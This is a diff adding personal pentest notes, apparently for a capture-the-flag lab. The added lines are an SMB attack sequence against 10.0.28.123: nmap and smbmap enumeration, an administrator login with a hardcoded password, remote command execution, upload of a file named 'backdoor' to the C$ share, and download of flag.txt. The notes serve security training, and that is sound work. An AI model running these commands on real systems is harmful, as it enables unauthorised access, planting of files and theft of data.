@@ -92,7 +92,18 @@ ls -al /usr/share/nmap/scripts/ | grep -e "ftp"            # for nmap
 cd  /usr/share/nmap/scripts/                               # for nmap
 ls -l | grep -e  ssh                                       # for nmap
 less ssh-hostkey.nse
-
+nmap 10.0.28.123
+nmap -p445 --script smb-protocols 10.0.28.123
+smbmap -u guest -p "" -d . -H 10.0.28.123
+smbmap -u administrator -p smbserver_771 -d . -H 10.0.28.123
+smbmap -H 10.0.28.123 -u administrator -p smbserver_771 -x 'ipconfig'
+smbmap -H 10.0.28.123 -u Administrator -p 'smbserver_771' -L
+smbmap -H 10.0.28.123 -u Administrator -p 'smbserver_771' -r 'C$'
+touch backdoor
+smbmap -H 10.0.28.123 -u Administrator -p 'smbserver_771' --upload '/root/backdoor' 'C$\backdoor'
+smbmap -H 10.0.28.123 -u Administrator -p 'smbserver_771' -r 'C$'
+smbmap -H 10.0.28.123 -u Administrator -p 'smbserver_771' --download 'C$\flag.txt'
+cat /root/10.0.28.123-C_flag.txt
 ```
 
 
